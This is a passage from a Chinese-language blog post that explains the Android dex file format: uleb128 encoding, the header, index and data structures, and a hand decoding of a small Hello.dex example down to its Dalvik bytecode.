class="number">4</span>;<span class="comment">//对结果进行符号位扩展</span></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    cur=*(ptr++);	<span class="comment">//第5个字节</span></span><br><span class="line">                    result|=cur&lt;&lt;<span class="number">28</span>;<span class="comment">//前5个字节的组合</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *pStream=ptr;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>uleb128p1类型很简单，值为uleb128的值加1。</p>
-<p><code>c0 83 92 25</code>计算uleb128值：</p>
-<p>第1个字节0xc0大于0x7f，表示需要用到第2个字节。<code>result=0xc0&amp;0x7f</code></p>
-<p>第2个字节0x83大于0x7f，表示需要用到第3个字节。<code>result2 = result1 + (0x83 &amp; 0x7f) &lt;&lt; 7</code></p>
-<p>第3个字节0x92大于0x7f，表示需要用到第4个字节。<code>result3 = result2 + (0x92 &amp; 0x7f) &lt;&lt; 14</code></p>
-<p>第4个字节0x25小于0x7f，表示到了结尾。<code>result4 = result3 + (0x25 &amp; 0x7f) &lt;&lt; 21</code></p>
-<p>最后计算结果为<code>0x40 + 0x180 + 0x48000 + 0x4a00000 = 0x4a481c0</code></p>
-<h4 id="2-dex文件整体结构"><a href="#2-dex文件整体结构" class="headerlink" title="2.dex文件整体结构"></a>2.dex文件整体结构</h4><p>dex文件由多个结构体组合而成。</p>
-<p><img src="/2018/08/15/dex文件格式详解/d3.jpg" alt="d3"></p>
-<ul>
-<li>dex header：dex文件头，它指定了dex文件的一些属性，并记录了其它6部分数据结构在dex文件中的物理偏移</li>
-<li>string_ids到class_def结构为“索引结构区”，真实的数据存放在data数据区</li>
-<li>link_data：静态链接数据区</li>
-</ul>
-<p>未经过优化的dex文件结构：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexFile</span>&#123;</span></span><br><span class="line">    DexHeader	Header;</span><br><span class="line">    DexStringId	StringIds[stringIdsSize];</span><br><span class="line">    DexTypeId	TypeIds[typeIdsSzie];</span><br><span class="line">    DexProtoId	ProtoIds[protoIdsSize];</span><br><span class="line">    DexFieldId	FieldIds[fieldIdsSize];</span><br><span class="line">    DexMethodId	MethodIds[methodIdsSize];</span><br><span class="line">    DexData		Data[];</span><br><span class="line">    DexLink		LinkData;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>(DexFile结构的声明在Android系统源码<code>dalvik\libdex\DexFile.h</code>文件中的，是dex文件被映射到内存中的结构，保存的是各个结构的指针，其中还包括了DexOptHeader与DexFile尾部的附加数据)</p>
-<ul>
-<li>DexHeader结构占用0x70个字节</li>
-</ul>
-<p><img src="/2018/08/15/dex文件格式详解/d4.jpg" alt="d4"></p>
-<ul>
-<li>70个字节解释如下：    <ul>
-<li>magic字段标识了一个有效的dex文件，值固定为<code>64 65 78 0a 30 33 35 00</code>，转换为字符串为<code>dex.035</code></li>
-<li>checksum段为dex文件的校验和，通过它来判断dex文件是否被损坏或篡改。</li>
-<li>signature字段用来识别最佳化之前的dex文件</li>
-<li>fileSize字段记录了包括DexHeader在内的整个dex文件的大小</li>
-<li>headerSize字段记录了DexHeader结构本身占用的字节数，目前它的值为0x70。</li>
-<li>endianTag字段指定了dex运行环境的cpu字节序，预设值ENDIAN_CONSTANT等于0x12345678，表示默认采用Little-Endian字节序</li>
-<li>linkSize字段与linkOff字段指定链接段的大小与文件偏移，大多数情况下它们的值都为0。</li>
-<li>mapOff字段指定了DexMapList结构的文件偏移</li>
-<li>接下来的字段分别表示DexStringId、DexTypeId、DexProtoId、DexFieldId、DexMethodId、DexClassDef以及数据段的大小与文件偏移。<ul>
-<li>DexHeader结构下面的数据为”索引结构区“与”数据区“</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>“索引结构区”中各数据结构的偏移地址都是从DexHeader结构的stringIdsOff～classDefsOff字段的值指定的，它们并非真正的类数据，而是指向dex文件的data数据区（DexData字段，实际上是ubyte字节数组，包含了程序所有使用到的数据）的偏移或数据结构索引。</li>
-</ul>
-<h4 id="3-dex文件结构分析"><a href="#3-dex文件结构分析" class="headerlink" title="3.dex文件结构分析"></a>3.dex文件结构分析</h4><p>Dalvik虚拟机解析dex文件的内容，最终将其映射成DexMapList数据结构。</p>
-<ul>
-<li>DexHeader结构的mapOff字段指明了DexMapList结构在dex文件中的偏移：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMapList</span>&#123;</span></span><br><span class="line">    u4	size;				<span class="comment">//DexMapItem的个数</span></span><br><span class="line">    DexMapItem	<span class="built_in">list</span>[<span class="number">1</span>];	<span class="comment">//DexMapItem结构</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//size字段表示接下来有多少个DexMapItem结构</span></span><br><span class="line"><span class="comment">//DexMapItem的结构如下：</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMapItem</span>&#123;</span></span><br><span class="line">    u2	type;				<span class="comment">//kDexType开头的类型</span></span><br><span class="line">    u2	unused;				<span class="comment">//未使用，用于字节对齐</span></span><br><span class="line">    u4	size;				<span class="comment">//指定类型的个数</span></span><br><span class="line">    u4	offset;				<span class="comment">//指令类型数据的文件偏移</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>type字段为一个枚举常量，通过类型名称很容易判断具体类型：</li>
-</ul>
-<p><img src="/2018/08/15/dex文件格式详解/d5.jpg" alt="d5"></p>
-<ul>
-<li><p>DexMapItem中的size字段指定了特定类型的个数，它们以特定的类型在dex文件中连续存放。</p>
-</li>
-<li><p>offset为该类型的文件起始偏移地址。</p>
-</li>
-<li><p>以Hello.dex为例，DexHeader结构的mapOff字段值为0x290，读取0x290处的一个双字值为0x0d，表明接下来会有13个DexMapItem结构。使用任意的十六进制编辑器打开Hello.dex，我使用的是winhex</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Hello.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> (a + b) * (a - b);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argc)</span> </span>&#123;</span><br><span class="line">		Hello hello = <span class="keyword">new</span> Hello();</span><br><span class="line">		System.out.println(hello.foo(<span class="number">5</span>, <span class="number">3</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p><img src="/2018/08/15/dex文件格式详解/6.png" alt="6"></p>
-<p>根据结构描述，可以整理出13个<strong>DexMapItem</strong>结构如表：</p>
-<p><img src="/2018/08/15/dex文件格式详解/7.png" alt="7"></p>
-<p>对比文件头DexHeader部分：</p>
-<p><img src="/2018/08/15/dex文件格式详解/8.png" alt="8"></p>
-<p>kDexTypeHeaderItem描述了整个DexHeader结构，它占用了文件的前0x70个字节的空间，而接下来的kDexTypeStringIdItem～kDexTypeClassDefItem与DexHeader当中对应的类型及类型个数字段的值是相同的。</p>
-<ul>
-<li>kDexTypeHeaderItem<ul>
-<li>kDexTypeHeaderItem描述了整个DexHeader结构，它占用了文件的前0x70个字节的空间</li>
-</ul>
-</li>
-</ul>
-<ul>
-<li><p>kDexTypeStringIdItem</p>
-<ul>
-<li><p>比如kDexTypeStringIdItem对应了DexHeader的stringIdsSize与stringIdsOff字段，表明了在0x70偏移处，有连续0x10个DexStringId对象。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DexStringId结构声明</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexStringId</span>&#123;</span></span><br><span class="line">    u4	stringDataOff;		<span class="comment">//字符串数据偏移</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>DexStringId结构只有一个stringDataOff字段，直接指向字符串数据，从0x70开始，整理16个字符串。</p>
-<p><img src="/2018/08/15/dex文件格式详解/9.png" alt="9"></p>
-<p><img src="/2018/08/15/dex文件格式详解/10.png" alt="10"></p>
-<p>上表中的字符串并非普通的ascii字符串，它们是由MUTF-8编码来表示的。</p>
-<ul>
-<li><p>MUTF-8含义为Modified UTF-8，即经过修改的UTF-8编码，它与传统的UTF-8很相似，但有以下几点区别：</p>
-<ul>
-<li>MUTF-8使用1～3字节编码长度。</li>
-<li>大于16位的Unicode编码U+10000~U+10ffff使用3字节来编码。</li>
-<li>U+0000采用2字节来编码。</li>
-<li>采用类似于C语言中的空字符null作为字符串的结尾。</li>
-</ul>
-</li>
-<li><p>MUTF-8可表示的有效字符范围有大小写字母与数字、“$”、“-”、“_”、U+00a1~U+1fff、U+2010~U+2027、U+2030~U+d7ff、U+e000~U+ffef、U+10000~U+10ffff。它的实现代码如下：</p>
-</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DEX_INLINE <span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">dexGetStringData</span><span class="params">(<span class="keyword">const</span> DexFile* pDexFile,<span class="keyword">const</span> DexStringId* pStringId)</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> u1* ptr=pDexFile-&gt;baseAddr+pStringId-&gt;stringDataOff;</span><br><span class="line">    <span class="comment">//指向MUTF-8字符串的指针</span></span><br><span class="line">    <span class="comment">//Skip the uleb128 length.</span></span><br><span class="line">    <span class="keyword">while</span>(*(ptr++)&gt;<span class="number">0x7f</span>) <span class="comment">/*empty*/</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">const</span> <span class="keyword">char</span>*) ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li><p>MUTF-8字符串的头部存放的是由u1eb128编码的字符的个数。注意：这里是个数，如字符序列“<code>02 e4 bd a0 e5 a5 bd 00</code>”头部的02即表示字符串有两个字符，“e4 bd a0”是UTF-8编码字符“你”，“e5 a5 bd”是UTF-8编码字符“好”，而最后的空字符0表示字符串结尾，不过字符个数好像没有算上它。</p>
-<p>eg:<code>0A 48 65 6C 6C 6F 2E 6A 61 76 61 00</code>=&gt;10个字符+hello.java+00</p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<ul>
-<li><p>kDexTypeTypeIdItem</p>
-<ul>
-<li><p>kDexTypeStringIdItem对应DexHeader中的typeIdsSize与typeIdsOff字段，指向的结构体为DexTypeId，声明如下:</p>
-   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexTypeId</span>&#123;</span></span><br><span class="line">    u4	descriptorIdx;	<span class="comment">//指向DexStringId列表的索引</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>   descriptorIdx为指向DexStringId列表的索引，它对应的字符串代表了具体类的类型。从0xb0开始有7个DexTypeId结构，也就是有7个字符串的索引，整理后：</p>
-<p>   <img src="/2018/08/15/dex文件格式详解/11.png" alt="11"></p>
-<p>   <img src="/2018/08/15/dex文件格式详解/12.png" alt="12"></p>
-</li>
-</ul>
-</li>
-<li><p>kDexTypeProtoIdItem</p>
-<ul>
-<li><p>kDexTypeProtoIdItem对应DexHeader中的protoIdsSize与protoIdsOff字段，指向的结构体为DexProtoId,声明如下：</p>
-   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexProtoId</span>&#123;</span></span><br><span class="line">    u4	shortyIdx;	<span class="comment">//指向DexStringId列表的索引</span></span><br><span class="line">    u4	returnTypeIdx;	<span class="comment">//指向DexTypeId列表的索引</span></span><br><span class="line">    u4	parametersOff;	<span class="comment">//指向DexTypeList的偏移</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>DexProtoId是一个方法声明结构体:</p>
-<ul>
-<li>shortyIdx为方法声明字符串</li>
-<li>returnTypeIdx为方法返回类型字符串</li>
-<li><p><strong>parametersOff指向一个DexTypeList结构体，存放了方法的参数列表</strong>，DexTypeList声明如下:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexTypeList</span>&#123;</span></span><br><span class="line">    u4	size;	<span class="comment">//接下来DexTypeItem的个数</span></span><br><span class="line">    DexTypeItem	<span class="built_in">list</span>[<span class="number">1</span>];	<span class="comment">//DexTypeItem结构</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//DexTypeItem声明如下：</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexTypeItem</span>&#123;</span></span><br><span class="line">    u2 typeIdx;		<span class="comment">//指向DexTypeId列表的索引</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p><strong>DexTypeItem中的typeIdx最终也是指向一个字符串.</strong></p>
-<p>从0xcc开始有4个DexProtoId结构，整理后如表</p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<pre><code>![13](dex文件格式详解\13.png)
-
-![14](dex文件格式详解\14.png)
-
-通过上表可以发现，**方法声明由返回类型与参数列表组成，并且返回类型位于参数列表的前面。**
-</code></pre><ul>
-<li><p>kDexTypeFieldIdItem</p>
-<ul>
-<li><p>kDexTypeFieldIdItem对应DexHeader中的fieldIdsSize与fieldIdsOff字段，指向的结构体为DexFieldId,声明如下：</p>
-   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexFieldId</span>&#123;</span></span><br><span class="line">    u2	classIdx;	<span class="comment">//类的类型，指向DexTypeId列表的索引</span></span><br><span class="line">    u2	typeIdx;	<span class="comment">//字段的类型，指向DexTypeId列表的索引</span></span><br><span class="line">    u4	nameIdx;	<span class="comment">//字段名，指向DexStringId列表的索引</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>   DexFieldId结构中的数据全部是索引值，指明了字段所在的类、字段的类型以及字段名。</p>
-<p>   从0xfc开始共有1个DexFieldId结构，整理后如：</p>
-<p>   <img src="/2018/08/15/dex文件格式详解/15.png" alt="15"></p>
-<p>   <img src="/2018/08/15/dex文件格式详解/16.png" alt="16"></p>
-</li>
-</ul>
-</li>
-<li><p>kDexTypeMethodIdItem</p>
-<ul>
-<li><p>kDexTypeMethodIdItem对应DexHeader中的methodIdsSize与methodIdsOff字段，指向的结构体为DexFieldId，声明如下：</p>
-   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMethodId</span>&#123;</span></span><br><span class="line">    u2	classIdx;	<span class="comment">//类的类型，指向DexTypeId列表的索引</span></span><br><span class="line">    u2	protoIdx;	<span class="comment">//声明类型，指向DexprotoId列表的索引</span></span><br><span class="line">    u4	nameIdx;	<span class="comment">//方法名，指向DexStringId列表的索引</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>   DexMethodId结构的数据也都是索引值，指明了方法所在的类、方法的声明以及方法名。</p>
-<p>   从0x104开始共有5个DexMethodId结构，整理后的结果</p>
-<p>   <img src="/2018/08/15/dex文件格式详解/17.png" alt="17"></p>
-<p>   <img src="/2018/08/15/dex文件格式详解/18.png" alt="18"></p>
-</li>
-</ul>
-</li>
-<li><p>kDexTypeClassDefItem</p>
-<ul>
-<li><p>kDexTypeClassDefItem对应DexHeader中的classDefsSize与classDefsOff字段，指向的结构体为DexClassDef，声明如下:</p>
-   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexClassDef</span>&#123;</span></span><br><span class="line">    u4	classIdx;		<span class="comment">//类的类型，指向DexTypeId列表的索引</span></span><br><span class="line">    u4	accessFlags;	<span class="comment">//访问标志</span></span><br><span class="line">    u4	superclassIdx;	<span class="comment">//父类类型，指向DexTypeId列表的索引</span></span><br><span class="line">    u4	interfacesOff;	<span class="comment">//接口，指向DexTypeList的偏移</span></span><br><span class="line">    u4	sourceFileIdx;	<span class="comment">//源文件名，指向DexStringId列表的索引</span></span><br><span class="line">    u4	annotationsOff;	<span class="comment">//注解，指向DexAnnotationsDirectoryItem结构</span></span><br><span class="line">    u4	classDataOff;	<span class="comment">//指向DexClassData结构的偏移</span></span><br><span class="line">    u4	staticValuesOff;<span class="comment">//指向DexEncodeArray结构的偏移</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>classIdx字段是一个索引值，表明类的类型</li>
-<li>accessFlags字段是类的访问标志，它是以ACC_开头的一个枚举值</li>
-<li>superclassIdx字段是父类类型索引值</li>
-<li>如果类中含有接口声明或实现，interfacesOff字段会指向1个DexTypeList结构，否则这里的值为0</li>
-<li>sourceFileIdx字段是字符串索引值，表示类所在的源文件名称</li>
-<li>annotationsOff字段指向注解目录结构，根据类型不同会有注解类、注解方法、注解字段与注解参数，如果类中没有注解，这里的值则为0</li>
-<li><strong>classDataOff字段指向DexClassData结构，它是类的数据部分</strong></li>
-<li><p>staticValuesOff字段指向DexEncodedArray结构，记录了类中的静态数据</p>
-<p><img src="/2018/08/15/dex文件格式详解/19.png" alt="19"></p>
-</li>
-</ul>
-</li>
-<li><p>DexClassData结构的声明在DexClass.h文件中，它的声明如下：</p>
-   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexClassData</span>&#123;</span></span><br><span class="line">    DexClassDataHeader	header;			<span class="comment">//指定字段与方法的个数</span></span><br><span class="line">    DexField*			staticFields;	<span class="comment">//静态字段，DexField结构</span></span><br><span class="line">    DexField*			instanceFiels;	<span class="comment">//实例字段，DexField结构</span></span><br><span class="line">    DexMethod*			directMethods;	<span class="comment">//直接方法，DexMethod结构</span></span><br><span class="line">    DexMethod*			virtualMethods;	<span class="comment">//虚方法，DexMethod结构</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//DexClassDataHeader结构记录了当前类中字段与方法的数目</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span>	<span class="title">DexClassDataHeader</span>&#123;</span></span><br><span class="line">    u4	staticFieldsSize;				<span class="comment">//静态字段个数</span></span><br><span class="line">    u4	instanceFieldsSize;				<span class="comment">//实例字段个数</span></span><br><span class="line">    u4	directMethodsSize;				<span class="comment">//直接方法个数</span></span><br><span class="line">    u4	virtualMethodsSize;				<span class="comment">//虚方法个数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>   <u>DexClassDataHeader的结构与DexClassData一样，都是在DexClass.h文件中声明的。</u></p>
-<p>   （为什么不是在DexFile.h中声明呢？它们都是DexFile文件结构的一部分！可能的原因是DexClass.h文件中所有结构的u4类型的字段其实都是uleb128类型，u1eb128使用1～5个字节来表示一个32位的值，大多数情况下，字段中这些数据可以用小于2个字节的空间来表示，因此，采用uleb128会节省更多的存储空间。</p>
-   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexField</span>&#123;</span></span><br><span class="line">    u4	fieldIdx;		<span class="comment">//指向DexFieldId的索引</span></span><br><span class="line">    u4	accessFlags;	<span class="comment">//访问标志</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>fieldIdx字段为指向DexFieldId的索引</li>
-<li><p>accessFlags字段与DexClassDef中的相应字段的类型相同。</p>
-<p>DexMethod结构描述方法的原型、名称、访问标志以及代码数据块，它的结构声明如下:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMethod</span>&#123;</span></span><br><span class="line">    u4	methodIdx;		<span class="comment">//指向DexMethodId的索引</span></span><br><span class="line">    u4 	accessFlags;	<span class="comment">//访问标志</span></span><br><span class="line">    u4	codeOff;		<span class="comment">//指向DexCode结构的偏移</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexCode</span>&#123;</span></span><br><span class="line">    u2	registersSize;	<span class="comment">//使用的寄存器个数</span></span><br><span class="line">    u2	insSize;		<span class="comment">//参数个数</span></span><br><span class="line">    u2	outsSize;		<span class="comment">//调用其他方法时使用的寄存器个数</span></span><br><span class="line">    u2	triesSize;		<span class="comment">//Try/Catch个数</span></span><br><span class="line">    u4	debugInfoOff;	<span class="comment">//指向调试信息的偏移</span></span><br><span class="line">    u4	insnsSize;		<span class="comment">//指令集个数，以2字节为单位</span></span><br><span class="line">    u2	insns[<span class="number">1</span>];		<span class="comment">//指令集</span></span><br><span class="line">    <span class="comment">//2字节空间用于结构对齐</span></span><br><span class="line">    <span class="comment">//try_item[triesSize]	DexTry结构</span></span><br><span class="line">    <span class="comment">//Try/Catch中handler的个数</span></span><br><span class="line">    <span class="comment">//catch_handler_item[handlersSize],DexCatchHandler结构</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>通过上面层层的分析，到这里终于看到存放指令集的结构。</p>
-</li>
-<li><p>registersSize字段指定了方法中使用的寄存器个数，即Smali语法时的“.register”指令的值。</p>
-</li>
-<li>insSize字段指定了方法的参数个数，即Smali语法中的“.paramter”指令。</li>
-<li>outsSize指定方法调用外部方法时使用的寄存器个数</li>
-<li>triesSize字段指定方法中Try/Catch的个数</li>
-<li>如果dex文件保留了调试信息，debugInfoOff字段会指向它，调试信息的解码函数为dexDecodeDebugInfo()。可在DexDebugInfo.cpp文件中查看其实现</li>
-<li>insnsSize字段指定了接下来的指令个数</li>
-<li><p>insns字段即为真正的代码部分</p>
-<p><img src="/2018/08/15/dex文件格式详解/20.png" alt="20"></p>
-</li>
-<li><p>0x27b开始先读取DexClassDataHeader结构，为4个uleb128值，结果分别为0、0、2、1，表示该类不含字段，有2个直接方法与1个虚方法。</p>
-</li>
-<li><p>由于类中不含字段，因此DexClassData结构中的两个DexField结构也就没戏了，从0x27f开始直接解析DexMethod</p>
-</li>
-<li><p>第1个字段为0，指向的DexMethodId为第1条，也就是”<code>&lt;init&gt;</code>“方法</p>
-</li>
-<li><p>第2个字段“81 80 04”为10001，访问标志为<code>ACC_PUBLIC | ACC_CONSTRUCTOR</code></p>
-</li>
-<li><p>第3个字段“cc 02”为14c，指向DexCode结构</p>
-<p><strong>(uleb如何计算：<code>[cc&amp;7f+（02&amp;7f）&lt;&lt;7]=14c</code>)</strong></p>
-<p><img src="/2018/08/15/dex文件格式详解/21.png" alt="21"></p>
-</li>
-<li><p>从0x14c开始解析DexCode，得出结果为：寄存器个数、参数、内部函数使用寄存器都为1个</p>
-</li>
-<li>方法中有4条指令，指令为“<code>7010 0400 0000 0e00</code>”</li>
-<li><a href="https://pan.baidu.com/s/1-uIjwkgonQNqLPY-yvfIPw" target="_blank" rel="noopener">dalvik-bytecode.html</a>:[密码: cewq]中查找到70的Opcode为invoke-direct，格式为35c</li>
-<li><p><a href="https://pan.baidu.com/s/1ex45xhKoYCIM7JhA6Knkgw" target="_blank" rel="noopener">instruction-formats.html</a>:[密码: k6n6],查找到35c的指令格式为<code>A|G|op BBBB F|E|D|C</code>,有7中表达方式。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[A=5] op &#123;vC, vD, vE, vF, vG&#125;, meth@BBBB</span><br><span class="line">[A=5] op &#123;vC, vD, vE, vF, vG&#125;, type@BBBB</span><br><span class="line">[A=4] op &#123;vC, vD, vE, vF&#125;, kind@BBBB</span><br><span class="line">[A=3] op &#123;vC, vD, vE&#125;, kind@BBBB</span><br><span class="line">[A=2] op &#123;vC, vD&#125;, kind@BBBB</span><br><span class="line">[A=1] op &#123;vC&#125;, kind@BBBB</span><br><span class="line">[A=0] op &#123;&#125;, kind@BBBB</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*指令7010中A为1，G为0，表示采用代码为“[A=1] op &#123;vC&#125;, kind@BBBB”方式,且其中的vC为v0寄存器;</span></span><br><span class="line"><span class="comment">指令后面的BBBB与“F|E|D|C”都是16位，7010后面的两个16位都为0，因此BBBB=4且F=E=D=C=0;</span></span><br><span class="line"><span class="comment">BBBB为kind@类型，它是指向DexMethodId列表的索引值，通过查找得到方法名为“&lt;init&gt;”;</span></span><br><span class="line"><span class="comment">指令0e00直接查表得到return-void;*/</span></span><br><span class="line"><span class="number">7010</span> <span class="number">0400</span> <span class="number">0000</span>	invoke-direct&#123;v0&#125;,Ljava/lang/Object;.&lt;init&gt;:()V</span><br><span class="line"><span class="number">0e00</span>			<span class="keyword">return</span>-<span class="keyword">void</span></span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>观察DexMapItem结构：</p>
-</li>
-</ul>
-<p><img src="/2018/08/15/dex文件格式详解/7.png" alt="7"></p>
-<ul>
-<li>分析整体结构：<ul>
-<li>kDexTypeCodeItem与上面分析的DexCode结构相对应</li>
-<li>kDexTypeTypeList与上面分析的DexTypeList结构相对应</li>
-<li>kDexTypeStringDataItem则指向了DexStringId字符串列表的首地址</li>
-<li>kDexTypeDebugInfoItem指向了调试信息偏移，与DexCode的debugInfoOff字段指向的内容相同</li>
-<li>kDexTypeClassDataItem指向了DexClassData结构</li>
-<li>kDexTypeMapList指向了DexMapItem结构自身</li>
-</ul>
-</li>
-</ul>
-<p><img src="/2018/08/15/dex文件格式详解/22.jpg" alt="22"></p>
-<p>自此：DEX文件格式分析完了，仔细让我琢磨了好多天。。。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/15/dex文件格式详解/">展开全文 >></a>
-        </p>
-      
-
-      
